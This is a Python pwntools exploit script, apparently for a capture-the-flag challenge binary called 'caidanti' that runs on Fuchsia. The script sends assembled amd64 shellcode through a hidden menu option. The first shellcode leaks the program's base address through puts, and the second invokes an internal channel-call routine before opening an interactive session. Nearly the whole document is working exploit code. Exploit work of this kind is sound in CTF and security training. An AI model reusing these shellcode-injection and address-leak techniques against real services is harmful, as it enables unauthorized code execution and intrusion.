from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./caidanti"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})
  #r = process (['socat', 'stdio', "'TCP6-CONNECT:['$(./netaddr --fuchsia)']:31337'"])


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))
  
def exec_shellcode (sc):
  r.sendline ("114514")
  rr ()
  r.sendline (str(len(sc)))
  r.send (sc)

def dump ():
  exec_shellcode ("\x0f\x05")


puts_plt = 0x10d00
open_plt = 0x10d30
read_plt = 0x10BF0
"""
nop #pop rax
nop #sub rax, 0x3960e # libfdio_base
nop # r15 is shellcode(mmaped) base
nop # r14 - 0xea0 = binary base
"""
sc = ""
sc += """
push rbp
push r15
push r14
push r13
push r12
push rbx
push r14
sub r14, 0xea0
mov rax, r14
add rax, {call_func}
mov rdi, rsp
call rax
""".format (call_func=puts_plt)
sc += """
pop rax
pop rbx
pop r12
pop r13
pop r14
pop r15
pop rbp
ret
"""


sc = asm (sc, arch='amd64', os='linux')

exec_shellcode (sc)
pie_base = (u64(r.recvn(6) + "\x00\x00") - 0xea0)
log.info ("pie_base: " + hex(pie_base))
elf.address = pie_base

zx_take_startup_plt = pie_base + 0x10d40
zx_vmar_root_self_plt = pie_base + 0x12220
zx_handle_close_plt = pie_base + 0x10cd0
zx_handle_save = pie_base + 0x12140
zx_channel_write = pie_base + 0x10df0
zx_channel_call = pie_base + 0x10e00
sub_7f00 = pie_base + 0x7f00
bss = pie_base + 0x12400

"""
r.sendline ("1")
rr()
r.sendline ("YouMadeAFIDLCall")
rr()
r.sendline ("hi")
"""

sc = """
push rbp
push r15
push r14
push r13
push r12
push rbx
"""
sc += """
xor rax, rax
push rax
mov rax, 0x1000000000000000
push rax
mov rax, 0x6c6c61434c444946
push rax
mov rax, 0x416564614d756f59
push rax
mov rdi, {save}
mov rdi, [rdi]
mov rsi, rsp
xor rax, rax
push rax
push rax
push rax
mov rdx, rsp
mov rax, {call_func}
call rax
mov rdi, [rsp]
mov rax, {call_puts}
call rax
""".format (call_func=sub_7f00, call_puts=pie_base+puts_plt, save=zx_handle_save, bss=bss)

sc += """
add rsp, 0x38
pop rbx
pop r12
pop r13
pop r14
pop r15
pop rbp
ret
"""

#open file


sc = asm (sc, arch='amd64', os='linux')

exec_shellcode(sc)

print (r.recvline())
#print hexdump (r.recvline())

r.interactive ()
